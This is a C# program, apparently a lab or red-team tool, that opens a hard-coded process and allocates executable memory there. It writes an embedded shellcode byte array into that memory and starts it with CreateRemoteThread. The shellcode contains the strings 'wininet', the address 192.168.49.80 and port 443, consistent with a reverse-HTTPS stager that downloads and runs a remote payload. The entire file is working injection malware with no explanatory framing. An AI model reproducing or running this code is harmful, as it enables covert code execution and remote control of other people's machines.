﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling =true)] 
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {

            IntPtr hProcess = OpenProcess(0x001f0fff, false, 5676);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            byte[] buf = new byte[652] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x48, 0x31, 0xd2, 0x56, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x41, 0x51, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x44, 0x8b, 0x40, 0x20, 0x50, 0x8b, 0x48, 0x18, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x4d, 0x31, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x41, 0x58, 0x41, 0x58, 0x48, 0x01, 0xd0, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x48, 0x31, 0xdb, 0x53, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x48, 0x89, 0xe1, 0x49, 0xc7, 0xc2, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x53, 0x53, 0x48, 0x89, 0xe1, 0x53, 0x5a, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x49, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0xe8, 0x0e, 0x00, 0x00, 0x00, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x34, 0x39, 0x2e, 0x38, 0x30, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x49, 0xc7, 0xc0, 0xbb, 0x01, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x6a, 0x03, 0x53, 0x49, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0xe8, 0x63, 0x00, 0x00, 0x00, 0x2f, 0x4d, 0x57, 0x69, 0x35, 0x46, 0x38, 0x58, 0x2d, 0x65, 0x4c, 0x76, 0x30, 0x34, 0x5f, 0x58, 0x68, 0x6c, 0x4b, 0x65, 0x4d, 0x67, 0x51, 0x44, 0x4e, 0x38, 0x71, 0x41, 0x68, 0x6e, 0x47, 0x55, 0x4f, 0x30, 0x64, 0x72, 0x42, 0x68, 0x59, 0x76, 0x73, 0x49, 0x6d, 0x51, 0x44, 0x4f, 0x46, 0x68, 0x58, 0x38, 0x6c, 0x46, 0x57, 0x50, 0x48, 0x61, 0x6c, 0x47, 0x4d, 0x33, 0x6c, 0x68, 0x6b, 0x53, 0x34, 0x7a, 0x67, 0x51, 0x56, 0x35, 0x61, 0x77, 0x56, 0x4b, 0x4b, 0x73, 0x49, 0x56, 0x4b, 0x69, 0x59, 0x6d, 0x67, 0x6e, 0x2d, 0x6e, 0x79, 0x76, 0x4b, 0x68, 0x74, 0x6b, 0x4f, 0x6f, 0x6a, 0x58, 0x75, 0x57, 0x00, 0x48, 0x89, 0xc1, 0x53, 0x5a, 0x41, 0x58, 0x4d, 0x31, 0xc9, 0x53, 0x48, 0xb8, 0x00, 0x32, 0xa8, 0x84, 0x00, 0x00, 0x00, 0x00, 0x50, 0x53, 0x53, 0x49, 0xc7, 0xc2, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x6a, 0x1f, 0x5a, 0x52, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x6a, 0x04, 0x41, 0x59, 0x49, 0xba, 0x75, 0x46, 0x9e, 0x86, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x4d, 0x31, 0xc0, 0x53, 0x5a, 0x48, 0x89, 0xf1, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x49, 0xc7, 0xc2, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x75, 0x1f, 0x48, 0xc7, 0xc1, 0x88, 0x13, 0x00, 0x00, 0x49, 0xba, 0x44, 0xf0, 0x35, 0xe0, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0xff, 0xcf, 0x74, 0x02, 0xeb, 0xaa, 0xe8, 0x55, 0x00, 0x00, 0x00, 0x53, 0x59, 0x6a, 0x40, 0x5a, 0x49, 0x89, 0xd1, 0xc1, 0xe2, 0x10, 0x49, 0xc7, 0xc0, 0x00, 0x10, 0x00, 0x00, 0x49, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x49, 0xba, 0x12, 0x96, 0x89, 0xe2, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb2, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd2, 0x58, 0xc3, 0x58, 0x6a, 0x00, 0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5 };
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        
        }
    }
}
